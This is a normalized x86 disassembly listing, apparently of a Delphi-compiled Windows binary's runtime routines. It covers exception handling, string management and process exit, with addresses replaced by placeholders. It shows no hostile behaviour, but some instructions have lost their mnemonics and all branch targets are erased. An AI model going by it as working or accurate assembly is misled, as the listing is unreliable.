add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402c18
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4039c0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4036a8
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4039f8
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403fb0
sub_403a20
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405d58
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_40326c
call sub_403608
sub_403a74
call sub_405d58
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_40326c
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4036d0
jmp edx
sub_403abc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027c0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403c1c
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c8a
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403ca4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cea
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d44
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405aec
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d68
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405aec
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d90
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403db4
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403e10
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e40
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40122c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403ecc
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403db4
call sub_403e40
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c44
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403c1c
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_4055b8
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403e10
push eax
call sub_401244
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403fbc
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026dc
pop eax
sub_403fe0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_404010
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404080
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_404054
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_404080
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026bc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_4040ac
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404080
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403fbc
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028b8
sub_4040dc
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4040fc
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404118
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403fbc
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404608
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040dc
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_4040dc
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404608
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4040ac
jmp r-xdata
sub_4041b4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040ac
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4041e4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404118
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_40422c
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_4040ac
not ecx
sub_404258
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_404284
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_404010
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404608
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404608
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028b8
pop edi
pop esi
pop ebx
retn
sub_4042c8
test edx edx
je r-xdata
mov edx ecx
jmp sub_404010
test ecx ecx
je sub_404010
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404284
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404080
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028b8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028b8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_404010
pop edx
pop eax
jmp sub_404284
call sub_404010
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_40433c
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404080
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404608
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028b8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_404010
dec [ edx - 0x8 ]
sub_4043c8
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404488
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404080
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026dc
sub_4044dc
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403fbc
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_4040ac
jmp r-xdata
pop ebx
retn 0x4
sub_40451c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404488#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028b8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404608
mov edi ecx
sub_404564
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404608
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028b8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028b8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4045c0
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404608
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403fbc
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404080
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4026fc
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028b8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4046b4
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4046d8
test edx edx
je sub_40469c
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_40469c
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
retn
sub_4046fc
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_40469c
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4048e4
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040fc
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4040fc
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4048e4
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404788
jmp r-xdata
sub_404788
test ecx ecx
je sub_40469c
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_4047ac
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404788
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404814
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404898
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404808
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404788
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4048e4
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_40468c
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404674
mov ebx eax
mov eax [ edi ]
call sub_404808
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028b8
mov eax esi
sub_404928
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404958
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404958
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404958
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404928
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402818
sub_4049f8
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a44
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404a44
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403fe0
jmp r-xdata
call sub_403fbc
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4046b4
jmp r-xdata
call sub_40469c
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404a2c
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a44
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4049f8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405628
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404f7c
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402818
sub_404b54
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028b8
mov edx [ eax + esi ]
add eax ebx
call sub_404010
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4046d8
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404b3c
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028b8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404c70
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404b54
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
